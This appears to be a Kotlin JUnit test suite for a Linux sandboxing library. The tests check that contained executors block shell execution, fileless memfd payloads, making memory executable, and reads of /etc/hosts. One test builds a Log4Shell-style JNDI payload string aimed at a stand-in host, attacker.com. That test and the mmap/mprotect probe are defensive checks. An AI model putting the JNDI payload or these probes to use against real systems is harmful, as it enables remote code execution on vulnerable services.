package demo
import io.mazewall.platform.native.LinuxNative
import io.mazewall.enforcer.api.Policy
import io.mazewall.platform.syscall.Arch
import io.mazewall.platform.syscall.NativeArg
import io.mazewall.enforcer.api.ContainedExecutors
import io.mazewall.enforcer.api.ContainmentViolationEvidence
import io.mazewall.enforcer.api.ContainmentViolationException
import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
import io.mazewall.ffi.NativeConstants
import io.mazewall.ffi.memory.ConfinedSegment
import org.junit.jupiter.api.Test
import java.io.File
import java.lang.foreign.Arena
import java.util.concurrent.ExecutionException
import java.util.concurrent.Executors
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class ProtectionDemonstrationTest {
    @Test
    fun `non-permission native error is not authenticated containment`() {
        val result = authenticateNativeDenial(NativeConstants.EINVAL)

        assertTrue(result is ScenarioOutcome.InfrastructureFailure)
    }

    @Test
    fun `permission native errors are authenticated containment`() {
        assertTrue(authenticateNativeDenial(NativeConstants.EPERM) is ScenarioOutcome.Denied)
        assertTrue(authenticateNativeDenial(NativeConstants.EACCES) is ScenarioOutcome.Denied)
    }

    @Test
    fun `Attack 1 - Classic Shell Execution Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.enforcer.api.Platform.isSupported()) return

        DemoFixture.create("protected-shell").use { fixture ->
            val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"

            val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }

            assertEquals(
                ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
                ContainmentViolationDetector.diagnose(ex)?.evidence,
                "Expected an inferred permission failure, got: ${ex.cause}",
            )

            assertFalse(fixture.marker.exists(), "Exploit marker should NOT exist")
        }
    }

    @Test
    fun `Attack 2 - Fileless Payload Creation Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.enforcer.api.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.NO_EXEC)

        try {
            safeExecutor
                .submit {
                    val arch = Arch.current()
                    Arena.ofConfined().use { arena ->
                        val name = arena.allocateFrom("test_memfd_protected")
                        val res =
                        LinuxNative.raw.syscall(
                            arch.memfdCreate.toLong(),
                            io.mazewall.platform.syscall.NativeArg.MemoryArg(ConfinedSegment(name)),
                            io.mazewall.platform.syscall.NativeArg.NullArg,
                        )

                        assertTrue(res is LinuxNative.SyscallResult.Error, "memfd_create should be blocked by NO_EXEC")
                        assertEquals(NativeConstants.EPERM, (res as LinuxNative.SyscallResult.Error).errno)
                    }
                }.get()
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 3 - Shellcode and Memory Pivoting Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.enforcer.api.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.builder().build())

        try {
            val outcome =
                safeExecutor
                    .submit<ScenarioOutcome> {
                        val arch = Arch.current()
                        val pageSize = 4096L
                        val mapping =
                            LinuxNative.raw.syscall(
                                arch.mmap.toLong(),
                                NativeArg.NullArg,
                                NativeArg.LongArg(pageSize),
                                NativeArg.IntArg(PROT_READ or PROT_WRITE),
                                NativeArg.IntArg(MAP_PRIVATE or MAP_ANONYMOUS),
                                NativeArg.IntArg(-1),
                                NativeArg.LongArg(0L),
                            )
                        val address =
                            when (mapping) {
                                is LinuxNative.SyscallResult.Success -> mapping.value
                                is LinuxNative.SyscallResult.Error -> mapping.throwErrno("mmap")
                            }
                        try {
                            when (
                                val protection =
                                    LinuxNative.raw.syscall(
                                        arch.mprotect.toLong(),
                                        NativeArg.LongArg(address),
                                        NativeArg.LongArg(pageSize),
                                        NativeArg.IntArg(PROT_READ or PROT_EXEC),
                                    )
                            ) {
                                is LinuxNative.SyscallResult.Success -> ScenarioOutcome.Completed("mprotect(PROT_EXEC) succeeded")
                                is LinuxNative.SyscallResult.Error -> {
                                    val errno = protection.errno
                                    authenticateNativeDenial(errno)
                                }
                            }
                        } finally {
                            LinuxNative.raw
                                .syscall(
                                    arch.munmap.toLong(),
                                    NativeArg.LongArg(address),
                                    NativeArg.LongArg(pageSize),
                                ).getOrThrow("munmap")
                        }
                    }.get()
            assertTrue(outcome is ScenarioOutcome.Denied, "Expected authenticated EPERM/EACCES, got $outcome")
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 4 - Path Traversal Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.enforcer.api.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        // PURE_COMPUTE includes PURE_COMPUTE_UNSAFE and blocks OPENAT, and automatically enables Landlock
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)

        try {
            assertFailsWith<ExecutionException> {
                safeExecutor
                    .submit {
                        File("/etc/hosts").readText()
                    }.get()
            }.let { e ->
                assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(e)?.evidence)
            }
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 5 - synchronous native open protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.enforcer.api.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        // PURE_COMPUTE uses PURE_COMPUTE_UNSAFE and automatically enables Landlock
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)

        try {
            safeExecutor
                .submit {
                    Arena.ofConfined().use { arena ->
                        val openResult =
                        LinuxNative.fileSystem.open(
                            ConfinedSegment(arena.allocateFrom("/etc/hosts")),
                            io.mazewall.platform.lifecycle.OpenFlags(0), // O_RDONLY
                        )

                        // If Landlock restricts the path, open returns -1 and errno is EACCES (13)
                        assertTrue(openResult is LinuxNative.SyscallResult.Error, "open of /etc/hosts should fail under Landlock")
                        val errno = (openResult as LinuxNative.SyscallResult.Error).errno
                        assertTrue(
                            errno == 1 || errno == 13,
                            "Expected EPERM (1) or EACCES (13), got: $errno",
                        )
                    }
                }.get()
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    private companion object {
        const val PROT_READ = 0x1
        const val PROT_WRITE = 0x2
        const val PROT_EXEC = 0x4
        const val MAP_PRIVATE = 0x02
        const val MAP_ANONYMOUS = 0x20
    }
}
